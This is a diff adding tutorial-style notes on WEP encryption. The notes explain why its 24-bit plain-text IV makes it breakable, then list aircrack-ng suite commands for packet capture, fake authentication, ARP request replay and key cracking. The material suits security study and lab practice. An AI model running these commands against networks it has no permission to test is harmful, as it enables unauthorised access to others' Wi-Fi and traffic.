@@ -123,6 +123,45 @@ Where
 * Random initialization vector (IV) is used to generate the key streams.
 * The initialization vector is only 24 bits.
 * IV + key (password) = key stream
+#### Vulnerability
+* IV is too small (only 24 bits)
+* IV is sent in plain text
+#### Result
+* IV will repeat on busy networks
+* This makes WEP vulnerable to statistical attacks
+* Repeated IV can be used to determine the key stream and break the encryption
+#### Crack: basic  case
+First need to capture sufficient number of packets. Need long time of no heavy traffic.
+```
+airodump-ng --bssid [NetworkMAC] --channel [CH] [filename] wlan0
+```
+Anslyse .cap and crack!
+```
+aircrack-ng filename.cap
+```
+#### Crack: fake authentication
+Usually access point only communicate with authenticated clients. So attacker need to associate with the AP before launching the attack.
+
+Start capturing.
+```
+airodump-ng --bssid [NetworkMAC] --channel [CH] --write [filename] wlan0
+```
+Fake auth attack. To associate with the router so that router communicate with hacker.
+```
+aireplay-ng --fakeauth 0 -a [NetworkMAC] -h [HackerMAC] wlan0
+```
+ARP request replay. Wait for an ARP packet. Capture it and replay it. This causes the AP to produce another packet with a new IV. Keep doing this untill we have enough IVs to crack the key.
+```
+aireplay-ng arpreplay -b [NetworkMAC] -h [HackerMAC] wlan0
+```
+Crack with following command.
+```
+aircrack-ng filename.cap
+```
+
+
+
+
 
 
 
